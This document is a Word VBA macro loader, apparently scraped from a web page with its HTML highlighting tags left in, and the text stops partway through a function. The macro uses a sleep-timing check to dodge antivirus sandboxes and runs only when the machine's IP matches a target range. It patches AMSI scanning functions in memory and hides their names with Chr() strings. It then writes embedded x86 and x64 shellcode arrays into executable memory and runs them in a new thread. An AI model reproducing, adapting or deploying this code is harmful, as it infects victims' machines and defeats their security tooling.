<span class="nx">Private</span> <span class="nx">Declare</span> <span class="nx">PtrSafe</span> <span class="nb">Function</span> <span class="nx">CreateThread</span> <span class="nx">Lib</span> <span class="dl">"</span><span class="s2">KERNEL32</span><span class="dl">"</span> <span class="p">(</span><span class="nx">ByVal</span> <span class="nx">SecurityAttributes</span> <span class="nx">As</span> <span class="nx">Long</span><span class="p">,</span> <span class="nx">ByVal</span> <span class="nx">StackSize</span> <span class="nx">As</span> <span class="nx">Long</span><span class="p">,</span> <span class="nx">ByVal</span> <span class="nx">StartFunction</span> <span class="nx">As</span> <span class="nx">LongPtr</span><span class="p">,</span> <span class="nx">ThreadParameter</span> <span class="nx">As</span> <span class="nx">LongPtr</span><span class="p">,</span> <span class="nx">ByVal</span> <span class="nx">CreateFlags</span> <span class="nx">As</span> <span class="nx">Long</span><span class="p">,</span> <span class="nx">ByRef</span> <span class="nx">ThreadId</span> <span class="nx">As</span> <span class="nx">Long</span><span class="p">)</span> <span class="nx">As</span> <span class="nx">LongPtr</span>
<span class="nx">Private</span> <span class="nx">Declare</span> <span class="nx">PtrSafe</span> <span class="nb">Function</span> <span class="nx">VirtualAlloc</span> <span class="nx">Lib</span> <span class="dl">"</span><span class="s2">KERNEL32</span><span class="dl">"</span> <span class="p">(</span><span class="nx">ByVal</span> <span class="nx">lpAddress</span> <span class="nx">As</span> <span class="nx">LongPtr</span><span class="p">,</span> <span class="nx">ByVal</span> <span class="nx">dwSize</span> <span class="nx">As</span> <span class="nx">Long</span><span class="p">,</span> <span class="nx">ByVal</span> <span class="nx">flAllocationType</span> <span class="nx">As</span> <span class="nx">Long</span><span class="p">,</span> <span class="nx">ByVal</span> <span class="nx">flProtect</span> <span class="nx">As</span> <span class="nx">Long</span><span class="p">)</span> <span class="nx">As</span> <span class="nx">LongPtr</span>
<span class="nx">Private</span> <span class="nx">Declare</span> <span class="nx">PtrSafe</span> <span class="nb">Function</span> <span class="nx">GetPrAddr</span> <span class="nx">Lib</span> <span class="dl">"</span><span class="s2">KERNEL32</span><span class="dl">"</span> <span class="nx">Alias</span> <span class="dl">"</span><span class="s2">GetProcAddress</span><span class="dl">"</span> <span class="p">(</span><span class="nx">ByVal</span> <span class="nx">hModule</span> <span class="nx">As</span> <span class="nx">LongPtr</span><span class="p">,</span> <span class="nx">ByVal</span> <span class="nx">lpProcName</span> <span class="nx">As</span> <span class="nb">String</span><span class="p">)</span> <span class="nx">As</span> <span class="nx">LongPtr</span>
<span class="nx">Private</span> <span class="nx">Declare</span> <span class="nx">PtrSafe</span> <span class="nb">Function</span> <span class="nx">VirtPro</span> <span class="nx">Lib</span> <span class="dl">"</span><span class="s2">KERNEL32</span><span class="dl">"</span> <span class="nx">Alias</span> <span class="dl">"</span><span class="s2">VirtualProtect</span><span class="dl">"</span> <span class="p">(</span><span class="nx">lpAddress</span> <span class="nx">As</span> <span class="nx">Any</span><span class="p">,</span> <span class="nx">ByVal</span> <span class="nx">dwSize</span> <span class="nx">As</span> <span class="nx">LongPtr</span><span class="p">,</span> <span class="nx">ByVal</span> <span class="nx">flNewProcess</span> <span class="nx">As</span> <span class="nx">LongPtr</span><span class="p">,</span> <span class="nx">lpflOldProtect</span> <span class="nx">As</span> <span class="nx">LongPtr</span><span class="p">)</span> <span class="nx">As</span> <span class="nx">LongPtr</span>
<span class="nx">Private</span> <span class="nx">Declare</span> <span class="nx">PtrSafe</span> <span class="nb">Function</span> <span class="nx">getmod</span> <span class="nx">Lib</span> <span class="dl">"</span><span class="s2">KERNEL32</span><span class="dl">"</span> <span class="nx">Alias</span> <span class="dl">"</span><span class="s2">GetModuleHandleA</span><span class="dl">"</span> <span class="p">(</span><span class="nx">ByVal</span> <span class="nx">lpLibFileName</span> <span class="nx">As</span> <span class="nb">String</span><span class="p">)</span> <span class="nx">As</span> <span class="nx">LongPtr</span>
<span class="nx">Private</span> <span class="nx">Declare</span> <span class="nx">PtrSafe</span> <span class="nx">Sub</span> <span class="nx">patched</span> <span class="nx">Lib</span> <span class="dl">"</span><span class="s2">KERNEL32</span><span class="dl">"</span> <span class="nx">Alias</span> <span class="dl">"</span><span class="s2">RtlFillMemory</span><span class="dl">"</span> <span class="p">(</span><span class="nx">Destination</span> <span class="nx">As</span> <span class="nx">Any</span><span class="p">,</span> <span class="nx">ByVal</span> <span class="nx">Length</span> <span class="nx">As</span> <span class="nx">Long</span><span class="p">,</span> <span class="nx">ByVal</span> <span class="nx">Fill</span> <span class="nx">As</span> <span class="nx">Byte</span><span class="p">)</span>
<span class="nx">Public</span> <span class="nx">Declare</span> <span class="nx">PtrSafe</span> <span class="nb">Function</span> <span class="nx">EnumProcessModulesEx</span> <span class="nx">Lib</span> <span class="dl">"</span><span class="s2">psapi.dll</span><span class="dl">"</span> <span class="p">(</span><span class="nx">ByVal</span> <span class="nx">hProcess</span> <span class="nx">As</span> <span class="nx">LongPtr</span><span class="p">,</span> <span class="nx">lphModule</span> <span class="nx">As</span> <span class="nx">LongPtr</span><span class="p">,</span> <span class="nx">ByVal</span> <span class="nx">cb</span> <span class="nx">As</span> <span class="nx">LongPtr</span><span class="p">,</span> <span class="nx">lpcbNeeded</span> <span class="nx">As</span> <span class="nx">LongPtr</span><span class="p">,</span> <span class="nx">ByVal</span> <span class="nx">dwFilterFlag</span> <span class="nx">As</span> <span class="nx">LongPtr</span><span class="p">)</span> <span class="nx">As</span> <span class="nx">LongPtr</span>
<span class="nx">Public</span> <span class="nx">Declare</span> <span class="nx">PtrSafe</span> <span class="nb">Function</span> <span class="nx">GetModuleBaseName</span> <span class="nx">Lib</span> <span class="dl">"</span><span class="s2">psapi.dll</span><span class="dl">"</span> <span class="nx">Alias</span> <span class="dl">"</span><span class="s2">GetModuleBaseNameA</span><span class="dl">"</span> <span class="p">(</span><span class="nx">ByVal</span> <span class="nx">hProcess</span> <span class="nx">As</span> <span class="nx">LongPtr</span><span class="p">,</span> <span class="nx">ByVal</span> <span class="nx">hModule</span> <span class="nx">As</span> <span class="nx">LongPtr</span><span class="p">,</span> <span class="nx">ByVal</span> <span class="nx">lpFileName</span> <span class="nx">As</span> <span class="nb">String</span><span class="p">,</span> <span class="nx">ByVal</span> <span class="nx">nSize</span> <span class="nx">As</span> <span class="nx">LongPtr</span><span class="p">)</span> <span class="nx">As</span> <span class="nx">LongPtr</span>

<span class="nb">Function</span> <span class="nx">MyMacro</span><span class="p">()</span>
 <span class="dl">'</span><span class="s1">Get current time, sleep 4 seconds, get time again.  If less than 4 seconds have passed, assume we are in a AV sandbox and exit without running rest of macro.
 Dim myTime
 myTime = Time
 Dim Timein As Date
 Timein = Date + myTime
 Sleep (4000)
 Dim second_time
 second_time = Time
 Dim Timeout As Date
 Timeout = Date + second_time
 Dim subtime As Variant
 subtime = DateDiff("s", Timein, Timeout)
 Dim vOut As Integer
 vOut = CInt(subtime)
 If subtime &lt; 3.5 Then
    Exit Function
 End If
 </span><span class="dl">'</span><span class="nx">initialize</span> <span class="nx">variables</span>
 <span class="nx">Dim</span> <span class="nx">Is64</span> <span class="nx">As</span> <span class="nb">Boolean</span>
 <span class="nx">Dim</span> <span class="nx">StrFile</span> <span class="nx">As</span> <span class="nb">String</span>
 <span class="nx">Dim</span> <span class="nx">check</span> <span class="nx">As</span> <span class="nb">Boolean</span>
 <span class="nx">Dim</span> <span class="nx">buf</span> <span class="nx">As</span> <span class="nx">Variant</span>
 <span class="nx">Dim</span> <span class="nx">addr</span> <span class="nx">As</span> <span class="nx">LongPtr</span>
 <span class="nx">Dim</span> <span class="nx">counter</span> <span class="nx">As</span> <span class="nx">LongPtr</span>
 <span class="nx">Dim</span> <span class="nx">data</span> <span class="nx">As</span> <span class="nb">String</span>
 <span class="nx">Dim</span> <span class="nx">res</span> <span class="nx">As</span> <span class="nx">LongPtr</span>
 <span class="nx">Dim</span> <span class="nx">ipcheck</span> <span class="nx">As</span> <span class="nb">Boolean</span>
 <span class="nx">ipcheck</span> <span class="o">=</span> <span class="nx">False</span>
 <span class="nx">Dim</span> <span class="nx">inscope</span> <span class="nx">As</span> <span class="nb">String</span>
 <span class="dl">'</span><span class="s1">define in scope IP</span><span class="dl">'</span><span class="nx">s</span><span class="p">.</span>  <span class="nx">We</span> <span class="nx">can</span> <span class="nx">use</span> <span class="nx">wildcards</span> <span class="nx">here</span><span class="p">.</span>
 <span class="nx">inscope</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">192.168.*</span><span class="dl">"</span>
 <span class="dl">'</span><span class="s1">Call ip check function.  Returns True if machine IP is in scope. If True, pass.  If False, exit.
 ipcheck = getMyIP(inscope)
 If ipcheck Then
 Else
    Exit Function
 End If
 </span><span class="dl">'</span><span class="nx">Dynamically</span> <span class="nx">resolve</span> <span class="nx">amsi</span><span class="p">.</span><span class="nx">dll</span>
 <span class="nx">StrFile</span> <span class="o">=</span> <span class="nx">Dir</span><span class="p">(</span><span class="dl">"</span><span class="s2">c:</span><span class="se">\</span><span class="s2">windows</span><span class="se">\</span><span class="s2">system32</span><span class="se">\</span><span class="s2">a?s?.d*</span><span class="dl">"</span><span class="p">)</span>
 <span class="dl">'</span><span class="s1">Call architecture function to determine if we are in 32 bit or 64 bit word. 64 bit returns True.
 Is64 = arch()
 </span><span class="dl">'</span><span class="nx">Call</span> <span class="nx">amsi</span> <span class="nx">check</span> <span class="kd">function</span> <span class="nx">to</span> <span class="nx">determine</span> <span class="k">if</span> <span class="nx">amsi</span><span class="p">.</span><span class="nx">dll</span> <span class="nx">is</span> <span class="nx">loaded</span> <span class="nx">into</span> <span class="nx">Word</span><span class="p">.</span> <span class="nx">This</span> <span class="nx">is</span> <span class="nx">the</span> <span class="k">case</span> <span class="k">in</span> <span class="nx">word</span> <span class="mi">2019</span><span class="o">+</span><span class="p">.</span> <span class="nx">Returns</span> <span class="nx">True</span> <span class="k">if</span> <span class="nx">Amsi</span> <span class="nx">is</span> <span class="nx">found</span><span class="p">.</span>
 <span class="nx">check</span> <span class="o">=</span> <span class="nx">amcheck</span><span class="p">(</span><span class="nx">StrFile</span><span class="p">)</span>
 <span class="dl">'</span><span class="s1">This portion to delete document body and replace with auto text (the "legit" content)
 </span><span class="dl">'</span><span class="nx">ActiveDocument</span><span class="p">.</span><span class="nx">Content</span><span class="p">.</span><span class="nx">Select</span>
 <span class="dl">'</span><span class="s1">Selection.Delete
 </span><span class="dl">'</span><span class="nx">ActiveDocument</span><span class="p">.</span><span class="nx">AttachedTemplate</span><span class="p">.</span><span class="nx">AutoTextEntries</span><span class="p">(</span><span class="dl">"</span><span class="s2">TheDoc</span><span class="dl">"</span><span class="p">).</span><span class="nx">Insert</span> <span class="nx">Where</span><span class="p">:</span><span class="o">=</span><span class="nx">Selection</span><span class="p">.</span><span class="nx">Range</span><span class="p">,</span> <span class="nx">RichText</span><span class="p">:</span><span class="o">=</span><span class="nx">True</span>
 <span class="dl">'</span><span class="s1">If amsi is found, call amsi patching function.  Pass architecture of Word as additional arg to function.
 If check Then
     patch StrFile, Is64
 End If
 </span><span class="dl">'</span><span class="nx">Include</span> <span class="nx">shellcode</span> <span class="k">for</span> <span class="nx">both</span> <span class="nx">x86</span> <span class="nx">and</span> <span class="nx">x64</span><span class="p">.</span>
 <span class="dl">'</span><span class="s1">also no encryption routine on this shellcode, might have to look into something like xor or rot or caeser cipher to strengten it
 If Is64 Then
    buf = Array(49, 125, 184, 25, 37, 29, 1, 53, 53, 53, 118, 134, 118, 133, 135, 125, 102, 7, 154, 125, 192, 135, 149, 125, 192, 135, 77, 125, 192, 135, 85, 134, 139, 125, 68, 236, 127, 127, 125, 192, 167, 133, 130, 102, 254, 125, 102, 245, 225, 113, _
	150, 177, 55, 97, 85, 118, 246, 254, 66, 118, 54, 246, 23, 34, 135, 125, 192, 135, 85, 118, 134, 192, 119, 113, 125, 54, 5, 155, 182, 173, 77, 64, 55, 68, 186, 167, 53, 53, 53, 192, 181, 189, 53, 53, 53, 125, 186, 245, 169, 156, _
	125, 54, 5, 133, 192, 125, 77, 121, 192, 117, 85, 126, 54, 5, 24, 139, 130, 102, 254, 125, 52, 254, 118, 192, 105, 189, 125, 54, 11, 125, 102, 245, 118, 246, 254, 66, 225, 118, 54, 246, 109, 21, 170, 38, 129, 56, 129, 89, 61, 122, _
	110, 6, 170, 13, 141, 121, 192, 117, 89, 126, 54, 5, 155, 118, 192, 65, 125, 121, 192, 117, 81, 126, 54, 5, 118, 192, 57, 189, 118, 141, 125, 54, 5, 118, 141, 147, 142, 143, 118, 141, 118, 142, 118, 143, 125, 184, 33, 85, 118, 135, _
	52, 21, 141, 118, 142, 143, 125, 192, 71, 30, 128, 52, 52, 52, 146, 125, 102, 16, 136, 126, 243, 172, 158, 163, 158, 163, 154, 169, 53, 118, 139, 125, 190, 22, 126, 252, 247, 129, 172, 91, 60, 52, 10, 136, 136, 125, 190, 22, 136, 143, _
	130, 102, 245, 130, 102, 254, 136, 136, 126, 239, 111, 139, 174, 220, 53, 53, 53, 53, 52, 10, 29, 67, 53, 53, 53, 102, 110, 103, 99, 102, 107, 109, 99, 105, 110, 99, 107, 107, 53, 143, 125, 190, 246, 126, 252, 245, 240, 54, 53, 53, _
	130, 102, 254, 136, 136, 159, 56, 136, 126, 239, 140, 190, 212, 251, 53, 53, 53, 53, 52, 10, 29, 8, 53, 53, 53, 100, 120, 161, 155, 101, 109, 138, 157, 148, 121, 130, 150, 169, 119, 107, 172, 123, 175, 101, 171, 125, 137, 134, 173, 151, _
	155, 125, 124, 119, 108, 175, 148, 142, 161, 133, 119, 106, 134, 127, 106, 106, 134, 136, 134, 138, 170, 109, 158, 132, 131, 109, 153, 154, 105, 137, 165, 125, 124, 163, 125, 143, 159, 155, 128, 150, 158, 164, 133, 109, 121, 160, 129, 135, 134, 157, _
	124, 120, 105, 139, 106, 163, 164, 128, 158, 156, 143, 165, 158, 141, 150, 166, 136, 109, 148, 162, 142, 124, 142, 109, 155, 153, 173, 174, 98, 109, 148, 159, 142, 135, 106, 125, 150, 167, 130, 143, 167, 152, 141, 119, 134, 132, 124, 167, 102, 162, _
	159, 160, 123, 126, 169, 163, 110, 131, 107, 155, 159, 109, 103, 165, 153, 168, 174, 138, 161, 105, 109, 165, 105, 142, 163, 98, 158, 173, 173, 162, 172, 125, 133, 164, 170, 107, 173, 139, 155, 153, 160, 162, 122, 170, 125, 168, 122, 137, 133, 157, _
	158, 155, 123, 158, 167, 133, 135, 175, 170, 134, 107, 156, 150, 121, 165, 133, 168, 155, 119, 148, 131, 132, 102, 106, 126, 165, 125, 110, 160, 120, 150, 134, 125, 157, 142, 53, 125, 190, 246, 136, 143, 118, 141, 130, 102, 254, 136, 125, 237, 53, _
	103, 221, 185, 53, 53, 53, 53, 133, 136, 136, 126, 252, 247, 32, 138, 99, 112, 52, 10, 125, 190, 251, 159, 63, 148, 125, 190, 38, 159, 84, 143, 135, 157, 181, 104, 53, 53, 126, 190, 21, 159, 57, 118, 142, 126, 239, 170, 123, 211, 187, _
	53, 53, 53, 53, 52, 10, 130, 102, 245, 136, 143, 125, 190, 38, 130, 102, 254, 130, 102, 254, 136, 136, 126, 252, 247, 98, 59, 77, 176, 52, 10, 186, 245, 170, 84, 125, 252, 246, 189, 72, 53, 53, 126, 239, 121, 37, 106, 21, 53, 53, _
	53, 53, 52, 10, 125, 52, 4, 169, 55, 32, 223, 29, 138, 53, 53, 53, 136, 142, 159, 117, 143, 126, 190, 6, 246, 23, 69, 126, 252, 245, 53, 69, 53, 53, 126, 239, 141, 217, 136, 26, 53, 53, 53, 53, 52, 10, 125, 200, 136, 136, _
	125, 190, 28, 125, 190, 38, 125, 190, 15, 126, 252, 245, 53, 85, 53, 53, 126, 190, 46, 126, 239, 71, 203, 190, 23, 53, 53, 53, 53, 52, 10, 125, 184, 249, 85, 186, 245, 169, 231, 155, 192, 60, 125, 54, 248, 186, 245, 170, 7, 141, _
	248, 141, 159, 53, 142, 126, 252, 247, 37, 234, 215, 139, 52, 10)
 Else
    buf = Array(49, 29, 196, 53, 53, 53, 149, 102, 7, 190, 26, 153, 192, 135, 101, 192, 135, 65, 192, 135, 73, 68, 236, 127, 91, 102, 52, 192, 167, 93, 102, 245, 225, 113, 150, 177, 55, 97, 85, 246, 4, 66, 54, 252, 126, 170, 36, 135, 140, 192, _
	135, 69, 192, 119, 113, 54, 5, 192, 117, 173, 186, 245, 169, 129, 54, 5, 133, 192, 125, 77, 192, 141, 85, 54, 8, 186, 254, 169, 113, 102, 52, 126, 192, 105, 192, 54, 11, 102, 245, 246, 4, 66, 225, 54, 252, 109, 21, 170, 41, 56, _
	178, 45, 112, 178, 89, 170, 21, 141, 192, 141, 89, 54, 8, 155, 192, 65, 128, 192, 141, 81, 54, 8, 192, 57, 192, 54, 5, 190, 121, 89, 89, 144, 144, 150, 142, 143, 134, 52, 21, 141, 148, 143, 192, 71, 30, 181, 52, 52, 52, 146, _
	157, 163, 154, 169, 53, 157, 172, 158, 163, 158, 137, 157, 129, 172, 91, 60, 52, 10, 102, 16, 136, 136, 136, 136, 136, 29, 115, 53, 53, 53, 130, 164, 175, 158, 161, 161, 150, 100, 106, 99, 101, 85, 93, 140, 158, 163, 153, 164, 172, 168, _
	85, 131, 137, 85, 107, 99, 102, 112, 85, 137, 167, 158, 153, 154, 163, 169, 100, 108, 99, 101, 112, 85, 167, 171, 111, 102, 102, 99, 101, 94, 85, 161, 158, 160, 154, 85, 124, 154, 152, 160, 164, 53, 157, 111, 139, 174, 220, 52, 10, 136, _
	136, 159, 56, 136, 136, 157, 240, 54, 53, 53, 29, 7, 53, 53, 53, 100, 168, 161, 122, 121, 122, 122, 153, 158, 102, 106, 125, 170, 109, 98, 148, 174, 159, 129, 98, 108, 151, 118, 155, 110, 140, 109, 164, 140, 154, 135, 104, 132, 134, 128, _
	101, 166, 159, 150, 142, 162, 154, 173, 124, 137, 126, 143, 151, 150, 160, 150, 151, 130, 141, 108, 129, 127, 156, 134, 98, 153, 138, 153, 124, 168, 128, 53, 133, 157, 140, 190, 212, 251, 52, 10, 190, 251, 136, 157, 53, 103, 29, 185, 136, 136, _
	136, 140, 136, 139, 157, 32, 138, 99, 112, 52, 10, 203, 159, 63, 148, 157, 181, 104, 53, 53, 190, 21, 159, 57, 133, 159, 84, 139, 157, 170, 123, 211, 187, 52, 10, 136, 136, 136, 136, 139, 157, 98, 59, 77, 176, 52, 10, 186, 245, 170, _
	73, 157, 189, 72, 53, 53, 157, 121, 37, 106, 21, 52, 10, 132, 170, 2, 29, 127, 53, 53, 53, 159, 117, 157, 53, 69, 53, 53, 157, 53, 53, 117, 53, 136, 157, 141, 217, 136, 26, 52, 10, 200, 136, 136, 190, 28, 140, 157, 53, 85, _
	53, 53, 136, 139, 157, 71, 203, 190, 23, 52, 10, 186, 245, 169, 4, 192, 60, 54, 248, 186, 245, 170, 26, 141, 248, 148, 29, 160, 52, 52, 52, 102, 110, 103, 99, 102, 107, 109, 99, 105, 110, 99, 107, 107, 53, 240, 37, 234, 215, 139, _
	159, 53, 136, 52, 10)

End If


</span><span class="dl">'</span><span class="nx">Create</span> <span class="k">new</span> <span class="nx">space</span> <span class="k">in</span> <span class="nx">memory</span> <span class="nx">within</span> <span class="nx">current</span> <span class="nx">process</span>
 <span class="nx">addr</span> <span class="o">=</span> <span class="nx">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">UBound</span><span class="p">(</span><span class="nx">buf</span><span class="p">),</span> <span class="o">&amp;</span><span class="nx">H3000</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">H40</span><span class="p">)</span>
 <span class="dl">'</span><span class="s1">Copy shellcode to newly created memory
 For counter = LBound(buf) To UBound(buf)
 data = Hex(buf(counter))
 patched ByVal (addr + counter), 1, ByVal ("&amp;H" &amp; data)
 Next counter
 </span><span class="dl">'</span><span class="nx">create</span> <span class="nx">thread</span> <span class="nx">to</span> <span class="nx">execute</span> <span class="nx">shellcode</span>
 <span class="nx">res</span> <span class="o">=</span> <span class="nx">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="nx">End</span> <span class="nb">Function</span>

 <span class="nb">Function</span> <span class="nx">arch</span><span class="p">()</span> <span class="nx">As</span> <span class="nb">Boolean</span>
 <span class="dl">'</span><span class="s1">check architecture of current word process
    #If Win64 Then
        arch = True
    #Else
        arch = False
    #End If
End Function

Public Function getMyIP(ipcheck As String) As Boolean
</span><span class="dl">'</span><span class="nx">uses</span> <span class="nx">WMI</span> <span class="nx">to</span> <span class="kd">get</span> <span class="nx">all</span> <span class="nx">IP</span><span class="dl">'</span><span class="s1">s associated with machine.  Each one is then checked against the wildcarded IP/network.  If a match is found, returns True
    Dim objWMI As Object
    Dim objQuery As Object
    Dim objQueryItem As Object
    Dim vIpAddress
    Dim counter As Integer
    Dim ips() As String
    Set objWMI = GetObject("winmgmts:</span><span class="se">\\</span><span class="s1">.</span><span class="se">\r</span><span class="s1">oot</span><span class="se">\</span><span class="s1">cimv2")
    Set objQuery = objWMI.ExecQuery("Select * from Win32_NetworkAdapterConfiguration Where IPEnabled = True")
    For Each objQueryItem In objQuery
        For Each vIpAddress In objQueryItem.ipaddress
            If CStr(vIpAddress) Like ipcheck Then
                getMyIP = True
            End If
        Next
    Next
End Function

Function amcheck(StrFile As String) As Boolean
</span><span class="dl">'</span><span class="nx">Checks</span> <span class="k">for</span> <span class="nx">amsi</span><span class="p">.</span><span class="nx">dll</span> <span class="k">in</span> <span class="nx">word</span> <span class="nx">process</span><span class="p">.</span> <span class="nx">If</span> <span class="nx">found</span><span class="p">,</span> <span class="nx">returns</span> <span class="nx">True</span>
<span class="nx">Dim</span> <span class="nx">szProcessName</span> <span class="nx">As</span> <span class="nb">String</span>
<span class="nx">Dim</span> <span class="nx">mdi</span> <span class="nx">As</span> <span class="nx">MODULEINFO</span>
<span class="nx">Dim</span> <span class="nx">hMod</span><span class="p">(</span><span class="mi">0</span> <span class="nx">To</span> <span class="mi">1023</span><span class="p">)</span> <span class="nx">As</span> <span class="nx">LongPtr</span>
<span class="nx">Dim</span> <span class="nx">res</span> <span class="nx">As</span> <span class="nx">LongPtr</span>
<span class="nx">amcheck</span> <span class="o">=</span> <span class="nx">False</span>
<span class="nx">res</span> <span class="o">=</span> <span class="nx">EnumProcessModulesEx</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="nx">hMod</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="mi">1024</span><span class="p">,</span> <span class="nx">cbNeeded</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">H3</span><span class="p">)</span>
<span class="nx">For</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span> <span class="nx">To</span> <span class="nx">UBound</span><span class="p">(</span><span class="nx">hMod</span><span class="p">)</span>
    <span class="nx">szProcessName</span> <span class="o">=</span> <span class="nb">String</span><span class="nx">$</span><span class="p">(</span><span class="mi">50</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="nx">GetModuleBaseName</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="nx">hMod</span><span class="p">(</span><span class="nx">i</span><span class="p">),</span> <span class="nx">szProcessName</span><span class="p">,</span> <span class="nx">Len</span><span class="p">(</span><span class="nx">szProcessName</span><span class="p">)</span>
    <span class="nx">If</span> <span class="nx">Left</span><span class="p">(</span><span class="nx">szProcessName</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="nx">StrFile</span> <span class="nx">Then</span>
        <span class="nx">amcheck</span> <span class="o">=</span> <span class="nx">True</span>
   <span class="nx">End</span> <span class="nx">If</span>
<span class="nx">Next</span> <span class="nx">i</span>

<span class="nx">End</span> <span class="nb">Function</span>

<span class="nb">Function</span> <span class="nx">patch</span><span class="p">(</span><span class="nx">StrFile</span> <span class="nx">As</span> <span class="nb">String</span><span class="p">,</span> <span class="nx">Is64</span> <span class="nx">As</span> <span class="nb">Boolean</span><span class="p">)</span>
<span class="dl">'</span><span class="s1">patches amsi.dll in memory in order to disable it.  Loads memory address of amsi.dll and then locates the AmsiUacInitialize function within it.  The AmsiScanBuffer and AmsiScanString functions are located via relative offset from AmsiUacInitialize and then overwritten with a nop and then a ret to disable them. 
</span><span class="dl">'</span> <span class="nx">Depending</span> <span class="nx">on</span> <span class="nx">architecture</span> <span class="nx">these</span> <span class="nx">offsets</span> <span class="nx">vary</span><span class="p">,</span> <span class="nx">so</span> <span class="nx">a</span> <span class="k">case</span> <span class="nx">is</span> <span class="nx">included</span> <span class="k">for</span> <span class="nx">x86</span> <span class="nx">and</span> <span class="nx">x64</span>
<span class="nx">Dim</span> <span class="nx">lib</span> <span class="nx">As</span> <span class="nx">LongPtr</span>
<span class="nx">Dim</span> <span class="nx">Func_addr</span> <span class="nx">As</span> <span class="nx">LongPtr</span>
<span class="nx">Dim</span> <span class="nx">temp</span> <span class="nx">As</span> <span class="nx">LongPtr</span>
<span class="nx">Dim</span> <span class="nx">old</span> <span class="nx">As</span> <span class="nx">LongPtr</span>
<span class="nx">Dim</span> <span class="nx">off</span> <span class="nx">As</span> <span class="nx">Integer</span>

<span class="nx">lib</span> <span class="o">=</span> <span class="nx">getmod</span><span class="p">(</span><span class="nx">StrFile</span><span class="p">)</span>

<span class="nx">If</span> <span class="nx">Is64</span> <span class="nx">Then</span>
    <span class="nx">off</span> <span class="o">=</span> <span class="mi">96</span>
<span class="nx">Else</span>
    <span class="nx">off</span> <span class="o">=</span> <span class="mi">80</span>
<span class="nx">End</span> <span class="nx">If</span>
<span class="nx">Func_addr</span> <span class="o">=</span> <span class="nx">GetPrAddr</span><span class="p">(</span><span class="nx">lib</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Am</span><span class="dl">"</span> <span class="o">&amp;</span> <span class="nx">Chr</span><span class="p">(</span><span class="mi">115</span><span class="p">)</span> <span class="o">&amp;</span> <span class="nx">Chr</span><span class="p">(</span><span class="mi">105</span><span class="p">)</span> <span class="o">&amp;</span> <span class="dl">"</span><span class="s2">U</span><span class="dl">"</span> <span class="o">&amp;</span> <span class="nx">Chr</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span> <span class="o">&amp;</span> <span class="dl">"</span><span class="s2">c</span><span class="dl">"</span> <span class="o">&amp;</span> <span class="dl">"</span><span class="s2">Init</span><span class="dl">"</span> <span class="o">&amp;</span> <span class="nx">Chr</span><span class="p">(</span><span class="mi">105</span><span class="p">)</span> <span class="o">&amp;</span> <span class="nx">Chr</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span> <span class="o">&amp;</span> <span class="dl">"</span><span class="s2">lize</span><span class="dl">"</span><span class="p">)</span> <span class="o">-</span> <span class="nx">off</span>
<span class="nx">temp</span> <span class="o">=</span> <span class="nx">VirtPro</span><span class="p">(</span><span class="nx">ByVal</span> <span class="nx">Func_addr</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="nx">patched</span> <span class="nx">ByVal</span> <span class="p">(</span><span class="nx">Func_addr</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">ByVal</span> <span class="p">(</span><span class="dl">"</span><span class="s2">&amp;H</span><span class="dl">"</span> <span class="o">&amp;</span> <span class="dl">"</span><span class="s2">90</span><span class="dl">"</span><span class="p">)</span>
<span class="nx">patched</span> <span class="nx">ByVal</span> <span class="p">(</span><span class="nx">Func_addr</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">ByVal</span> <span class="p">(</span><span class="dl">"</span><span class="s2">&amp;H</span><span class="dl">"</span> <span class="o">&amp;</span> <span class="dl">"</span><span class="s2">C3</span><span class="dl">"</span><span class="p">)</span>
<span class="nx">temp</span> <span class="o">=</span> <span class="nx">VirtPro</span><span class="p">(</span><span class="nx">ByVal</span> <span class="nx">Func_addr</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="nx">old</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

<span class="nx">If</span> <span class="nx">Is64</span> <span class="nx">Then</span>
    <span class="nx">off</span> <span class="o">=</span> <span class="mi">352</span>
<span class="nx">Else</span>
    <span class="nx">off</span> <span class="o">=</span> <span class="mi">256</span>
<span class="nx">End</span> <span class="nx">If</span>
<span class="nx">Func_addr</span> <span class="o">=</span> <span class="nx">GetPrAddr</span><span class="p">(</span><span class="nx">lib</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Am</span><span class="dl">"</span> <span class="o">&amp;</span> <span class="nx">Chr</span><span class="p">(</span><span class="mi">115</span><span class="p">)</span> <span class="o">&amp;</span> <span class="nx">Chr</span><span class="p">(</span><span class="mi">105</span><span class="p">)</span> <span class="o">&amp;</span> <span class="dl">"</span><span class="s2">U</span><span class="dl">"</span> <span class="o">&amp;</span> <span class="nx">Chr</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span> <span class="o">&amp;</span> <span class="dl">"</span><span class="s2">c</span><span class="dl">"</span> <span class="o">&amp;</span> <span class="dl">"</span><span class="s2">Init</span><span class="dl">"</span> <span class="o">&amp;</span> <span class="nx">Chr</span><span class="p">(</span><span class="mi">105</span><span class="p">)</span> <span class="o">&amp;</span> <span class="nx">Chr</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span> <span class="o">&amp;</span> <span class="dl">"</span><span class="s2">lize</span><span class="dl">"</span><span class="p">)</span> <span class="o">-</span> <span class="nx">off</span>
